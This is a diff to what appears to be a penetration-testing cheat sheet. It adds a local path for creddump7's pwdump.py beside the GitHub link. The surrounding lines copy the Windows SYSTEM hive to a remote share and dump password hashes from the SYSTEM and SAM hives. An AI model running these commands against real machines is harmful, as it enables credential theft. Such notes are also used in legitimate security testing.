@@ -1002,7 +1002,9 @@ copy C:\Windows\Repair\SYSTEM \\<IP>\<SHARE>\
 ```
 
 #### Run creddump pdump.py
-https://github.com/Neohapsis/creddump7.git
+- https://github.com/Neohapsis/creddump7.git
+- /usr/share/creddump7/pwdump.py
+
 ```
 python2 creddump7/pwdump.py SYSTEM SAM
 ```
